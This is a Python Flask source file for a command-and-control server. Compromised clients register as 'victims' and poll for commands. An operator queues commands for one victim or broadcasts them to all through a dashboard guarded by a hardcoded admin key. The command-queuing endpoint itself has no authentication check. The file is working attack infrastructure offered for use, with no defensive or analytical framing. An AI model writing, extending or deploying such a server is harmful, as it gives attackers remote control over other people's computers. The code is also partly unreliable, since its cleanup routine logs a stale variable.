from flask import Flask, request, jsonify, render_template, session, redirect, url_for
import os
import json
import time

app = Flask(__name__)
app.secret_key = os.urandom(24) # Secure random key for sessions

# DATA STORAGE (In-Memory)
VICTIMS = {}
COMMAND_QUEUE = {}
LOGS = [] # Format: { "time": "HH:MM:SS", "type": "INFO/WARN/CMD", "msg": "..." }

# CONFIG
ADMIN_KEY = "Slay7676guyufezfze"

def add_log(log_type, message):
    timestamp = time.strftime("%H:%M:%S")
    LOGS.insert(0, {"time": timestamp, "type": log_type, "msg": message})
    if len(LOGS) > 100: LOGS.pop() # Keep last 100

# --- WEB INTERFACE ROUTES ---

@app.route('/')
def index():
    if session.get('logged_in'):
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form['password'] == ADMIN_KEY:
            session['logged_in'] = True
            add_log("INFO", "Admin logged in")
            return redirect(url_for('dashboard'))
        else:
            error = 'Invalid Access Key'
            add_log("WARN", "Failed login attempt")
    return render_template('login.html', error=error)

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'): return redirect(url_for('login'))
    return render_template('dashboard.html')

@app.route('/logs')
def logs_page():
    if not session.get('logged_in'): return redirect(url_for('login'))
    return render_template('logs.html', logs=LOGS)

@app.route('/settings')
def settings_page():
    if not session.get('logged_in'): return redirect(url_for('login'))
    return render_template('settings.html', admin_key=ADMIN_KEY)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# --- API ROUTES ---

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    uid = str(data.get('userid'))
    username = data.get('username')
    
    if uid not in VICTIMS:
        add_log("INFO", f"New Victim Connected: {username} ({uid})")
    
    VICTIMS[uid] = {
        "name": username,
        "last_seen": time.time()
    }
    return jsonify({"status": "success", "msg": "Registered"})

@app.route('/poll/<userid>', methods=['GET'])
def poll(userid):
    uid = str(userid)
    if uid in VICTIMS:
        VICTIMS[uid]['last_seen'] = time.time()
    
    cmd = COMMAND_QUEUE.get(uid)
    if cmd:
        del COMMAND_QUEUE[uid]
        return jsonify({"command": cmd})
    return jsonify({"command": "NO_CMD"})

@app.route('/command', methods=['POST'])
def send_command():
    # Web Dashboard check (if cookie present)
    is_web_user = session.get('logged_in')
    
    data = request.json
    target_id = str(data.get('target'))
    cmd = data.get('command')
    
    if target_id == "ALL":
        count = 0
        for uid in VICTIMS:
            COMMAND_QUEUE[uid] = cmd
            count += 1
        add_log("CMD", f"Broadcast '{cmd}' to {count} victims")
        return jsonify({"status": "broadcast_queued", "count": count, "cmd": cmd})
    else:
        COMMAND_QUEUE[target_id] = cmd
        v_name = VICTIMS.get(target_id, {}).get("name", "Unknown")
        add_log("CMD", f"Sent '{cmd}' to {v_name}")
        return jsonify({"status": "queued", "target": target_id, "cmd": cmd})

@app.route('/victims', methods=['GET'])
def get_victims():
    cleanup_victims()
    return jsonify(VICTIMS)

@app.route('/api/clear_logs', methods=['POST'])
def clear_logs():
    if not session.get('logged_in'): return jsonify({"error": "Unauthorized"}), 401
    LOGS.clear()
    add_log("INFO", "Logs cleared by admin")
    return jsonify({"status": "cleared"})

def cleanup_victims():
    # Remove victims inactive for > 30 seconds
    now = time.time()
    to_remove = [uid for uid, data in VICTIMS.items() if now - data['last_seen'] > 30]
    for uid in to_remove:
        del VICTIMS[uid]
        add_log("INFO", f"Victim Disconnected: {data['name']} (Timeout)")


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
